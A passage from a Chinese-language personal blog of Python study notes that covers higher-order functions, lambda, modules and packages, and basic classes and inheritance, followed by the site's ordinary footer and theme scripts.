<h6 id="18"><a href="#18" class="headerlink" title="18."></a>18.</h6><p>map()函数接收两个参数，一个是函数，一个是Iterable，map将传入的函数依次作用到序列的每个元素，并把结果作为新的Iterator返回<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def f(x):</span><br><span class="line">...     return x * x</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; r = map(f, [1, 2, 3, 4, 5, 6, 7, 8, 9])</span><br><span class="line">&gt;&gt;&gt; list(r)</span><br><span class="line">[1, 4, 9, 16, 25, 36, 49, 64, 81]</span><br></pre></td></tr></table></figure></p>
<h6 id="19"><a href="#19" class="headerlink" title="19."></a>19.</h6><p>两个import语义有差异<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import datetime</span><br><span class="line">print(datetime.datetime.now())</span><br></pre></td></tr></table></figure></p>
<p>是引入整个datetime包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from datetime import datetime</span><br><span class="line">print(datetime.now())</span><br></pre></td></tr></table></figure></p>
<p>是只引入datetime包里的datetime类<br>所以import之后前者是datetime这个包可见 后者是datetime.datetime这个类可见</p>
<h6 id="20"><a href="#20" class="headerlink" title="20."></a>20.</h6><p>filter()接收一个函数和一个序列，用于过滤序列<br>例如，在一个list中，删掉偶数，只保留奇数，可以这么写：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def is_odd(n):</span><br><span class="line">    return n % 2 == 1</span><br><span class="line">list(filter(is_odd, [1, 2, 4, 5, 6, 9, 10, 15]))</span><br><span class="line"># 结果: [1, 5, 9, 15]</span><br></pre></td></tr></table></figure></p>
<p>21.sorted()函数对list进行排序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; sorted([36, 5, -12, 9, -21], key=abs)</span><br><span class="line">[5, 9, -12, -21, 36]</span><br></pre></td></tr></table></figure></p>
<p>str.lower表示忽略大小写，reverse=True表示反向排序</p>
<p>从这几个函数理解高阶函数的意义就是能够利用其他函数对元素进行处理</p>
<h6 id="22"><a href="#22" class="headerlink" title="22."></a>22.</h6><p>匿名函数lamba，就是只能有一个表达式，不用写return，返回值就是该表达式的结果。用匿名函数有个好处，因为函数没有名字，不必担心函数名冲突。此外，匿名函数也是一个函数对象，也可以把匿名函数赋值给一个变量，再利用变量来调用该函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; list(map(lambda x: x * x, [1, 2, 3, 4, 5, 6, 7, 8, 9]))</span><br><span class="line">[1, 4, 9, 16, 25, 36, 49, 64, 81]</span><br></pre></td></tr></table></figure></p>
<h6 id="23"><a href="#23" class="headerlink" title="23."></a>23.</h6><p>python2.x中print是一个语句，不用加括号，而在3.x中，print变成了一个函数，要加括号，其中的分隔符用sep定义，结束符用end定义，格式符用%定义，后加元组（）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print &quot;%f, % s&quot; % (3.4, &quot;Hello World!&quot;)  </span><br><span class="line">3.400000, Hello World!</span><br></pre></td></tr></table></figure></p>
<h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><h6 id="1-1"><a href="#1-1" class="headerlink" title="1."></a>1.</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">  # -*- coding: utf-8 -*-</span><br><span class="line">&apos; a test module &apos;</span><br></pre></td></tr></table></figure>
<p>第1行和第2行是标准注释，第1行注释可以让这个hello.py文件直接在Unix/Linux/Mac上运行，第2行注释表示.py文件本身使用标准UTF-8编码，第3行是一个字符串，表示模块的文档注释，任何模块代码的第一个字符串都被视为模块的文档注释<br>import sys<br>导入模块，导入sys模块后，我们就有了变量sys指向该模块，利用sys这个变量，就可以访问sys模块的所有功能，要引用该模块内的函数用sys.函数名（）</p>
<h6 id="2-1"><a href="#2-1" class="headerlink" title="2."></a>2.</h6><p>作用域：在一个模块中，我们可能会定义很多函数和变量，但有的函数和变量我们希望给别人使用，有的函数和变量我们希望仅仅在模块内部使用。在Python中，是通过_前缀来实现的。类似_xxx和<strong>xxx这样的函数或变量就是非公开的（private），不应该被直接引用，比如_abc，</strong>abc等；</p>
<h6 id="3-1"><a href="#3-1" class="headerlink" title="3."></a>3.</h6><p>包：在文件系统中，包就是一个文件夹，模块就是一个.py文件，区分包与普通文件夹在于每一个包下面都有一个—init—.py文件，并且每一层都有，不同的包里面的同名函数用包名.函数名区分<br><img src="http://ww4.sinaimg.cn/large/0060lm7Tly1fpmvimueawj30h90cogq3.jpg" alt="image"></p>
<h6 id="4-1"><a href="#4-1" class="headerlink" title="4."></a>4.</h6><p>如果我们只是应用包里的某些函数，可以使用from math import pow, sin, log来导入</p>
<h6 id="5-1"><a href="#5-1" class="headerlink" title="5."></a>5.</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">   	 from cStringIO import StringIO</span><br><span class="line">    except ImportError:</span><br><span class="line">    	from StringIO import StringIO</span><br></pre></td></tr></table></figure>
<p>上述代码先尝试从cStringIO导入，如果失败了（比如cStringIO没有被安装），再尝试从StringIO导入。这样，如果cStringIO模块存在，则我们将获得更快的运行速度，如果cStringIO不存在，则顶多代码运行速度会变慢，但不会影响代码的正常执行。try 的作用是捕获错误，并在捕获到指定错误时执行 except 语句。</p>
<h6 id="6-1"><a href="#6-1" class="headerlink" title="6."></a>6.</h6><p>第三方模块载入在py2.7以后已经自带了pip，可以利用piip下载第三方模块，并且IDEpcharm中自带pip。import载入模块时，遇到未下载第三方模块会提醒你下载</p>
<h2 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h2><h6 id="1-2"><a href="#1-2" class="headerlink" title="1."></a>1.</h6><p>面向对象编程可以看成是不同对象的相互调用，基本思想为类和实例，必须牢记类是抽象的模板，比如Student类，而实例是根据类创建出来的一个个具体的“对象”，每个对象都拥有相同的方法，但各自的数据可能不同。<br><img src="http://ww3.sinaimg.cn/large/0060lm7Tly1fpmvjxjg5nj30qq0gjn2b.jpg" alt="image"></p>
<h6 id="2-2"><a href="#2-2" class="headerlink" title="2."></a>2.</h6><p>类通过关键字class定义，类名以大写字母开头，紧接着是(object)，表示该类是从哪个类继承下来的。有了类就可以创建具体的实例，实例用类名＋（）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class Person(object):</span><br><span class="line">    pass  #pass能够创建一个最简单的类</span><br><span class="line">xiaoming = Person()</span><br><span class="line">xiaohong = Person()</span><br><span class="line">print xiaoming</span><br><span class="line">print xiaohong</span><br><span class="line">print xiaoming==xiaohong</span><br><span class="line">&gt;&gt;&gt;&lt;__main__.Person object at 0x7fb705015450&gt;  #结果中出现的__main__意思是，调用模块本身</span><br><span class="line">	&lt;__main__.Person object at 0x7fb704f54ad0&gt;</span><br><span class="line">	False # 说明两个实例并不相同</span><br></pre></td></tr></table></figure></p>
<p>关于为什么要继承object类[<a href="https://www.zhihu.com/question/19754936" target="_blank" rel="noopener">https://www.zhihu.com/question/19754936</a>]   </p>
<h6 id="3-2"><a href="#3-2" class="headerlink" title="3."></a>3.</h6><p>实例的属性使用实例,属性表示，在定义 Person 类时，可以为Person类添加一个特殊的<strong>init</strong>()方法，当创建实例时，<strong>init</strong>()方法被自动调用，我们就能在此为每个实例都统一属性<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class Person(object):</span><br><span class="line">    def __init__(self, name, gender, birth):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.gender = gender</span><br><span class="line">        self.birth = birth</span><br></pre></td></tr></table></figure></p>
<p><strong>init</strong>() 方法的第一个参数必须是 self（也可以用别的名字，但建议使用习惯用法），后续参数则可以自由指定，和定义函数没有任何区别</p>
<h6 id="4-2"><a href="#4-2" class="headerlink" title="4."></a>4.</h6><p>关于访问限制，在属性前面加上<strong>，如</strong>job该属性就无法被外部访问到，而<strong>job</strong>作为特殊属性可以被外部访问，_job也可以被外部访问</p>
<h6 id="5-2"><a href="#5-2" class="headerlink" title="5."></a>5.</h6><p>实例属性每个实例各自拥有，互相独立，而类属性有且只有一份，该类下的实例都可以使用类属性，在内部函数中调用类属性，需要使用类名.类属性名，当实例属性和类属性重名时，实例属性优先级高，它将屏蔽掉对类属性的访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class Person(object):</span><br><span class="line">    address = &apos;Earth&apos;  #定义类属性</span><br><span class="line">    def __init__(self, name):   #定义实例属性</span><br><span class="line">        self.name = name</span><br></pre></td></tr></table></figure></p>
<h6 id="6-2"><a href="#6-2" class="headerlink" title="6."></a>6.</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class Student(object):</span><br><span class="line">    ...</span><br><span class="line">    def set_score(self, score):</span><br><span class="line">        if 0 &lt;= score &lt;= 100:</span><br><span class="line">            self.__score = score</span><br><span class="line">        else:</span><br><span class="line">            raise ValueError(&apos;bad score&apos;)  #可以对参数做检查，避免传入无效的参数</span><br></pre></td></tr></table></figure>
<h6 id="7-1"><a href="#7-1" class="headerlink" title="7."></a>7.</h6><p>方法就是与实例绑定的函数，和普通函数不同，方法可以直接访问实例的数据</p>
<h6 id="8-1"><a href="#8-1" class="headerlink" title="8."></a>8.</h6><p>在面向对象的程序设计中，当我们定义一个class的时候，可以从某个现有的class继承，新的class称为子类（Subclass），而被继承的class称为基类、父类或超类（Base class、Super class），对于前面的类，括号里面的object就是他们的父类，子类继承父类全部功能<br><img src="http://ww4.sinaimg.cn/large/0060lm7Tly1fpmvkggipfj30k90but8p.jpg" alt="image"></p>
<h6 id="9-1"><a href="#9-1" class="headerlink" title="9."></a>9.</h6><p>加强记忆，一种类的实例可以应用这个类里面的函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class Timer(object):</span><br><span class="line">    def run(self):</span><br><span class="line">        print(&apos; Timer is  Start...&apos;)</span><br><span class="line">dog=Timer()</span><br><span class="line">dog.run()   #实例dog应用了Timer类中的Run函数</span><br></pre></td></tr></table></figure></p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/">python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/技术/">技术</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
  
    <nav id="page-nav">
      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
    </nav>
  
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                &copy; 2018 jas0nwhy
            </div>
            <div class="footer-right">
                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="http://bestwing.me" target="_blank">Sw'blog</a> by Swing
            </div>
        </div>
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style='display:none'>
                        <span id="site-visit" >海贼到访数: 
                            <span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>, </span>
                
                
                    <span id="busuanzi_container_page_pv" style='display:none'>
                        <span id="page-visit">本页阅读量: 
                            <span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        
    </div>
</footer>

    </div>
    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
<script src="/js/main.js"></script>

    <script>
        $(document).ready(function() {
            var backgroundnum = 24;
            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
        })
    </script>





<div class="scroll" id="scroll">
    <a href="#"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments"><i class="fa fa-comments-o"></i></a>
    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    $(document).ready(function() {
        if ($("#comments").length < 1) {
            $("#scroll > a:nth-child(2)").hide();
        };
    })
</script>

<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>

  <script language="javascript">
    $(function() {
        $("a[title]").each(function() {
            var a = $(this);
            var title = a.attr('title');
            if (title == undefined || title == "") return;
            a.data('title', title).removeAttr('title').hover(

            function() {
                var offset = a.offset();
                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
                    top: offset.top - a.outerHeight() - 15,
                    left: offset.left + a.outerWidth()/2 + 1
                }).fadeIn(function() {
                    var pop = $(this);
                    setTimeout(function() {
                        pop.remove();
                    }, pop.text().length * 800);
                });
            }, function() {
                $("#anchortitlecontainer").remove();
            });
        });
    });
</script>


    <script type="text/javascript">
      window.onload = function(){
        document.getElementById("search").onclick = function(){
            console.log("search")
            search();
        }
      }
      function search(){
        (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
        (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
        e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
        })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');

        _st('install','A1Pz-LKMXbrzcFg2FWi6','2.0.0');
      }
    </script>

  </div>
</body>
</html>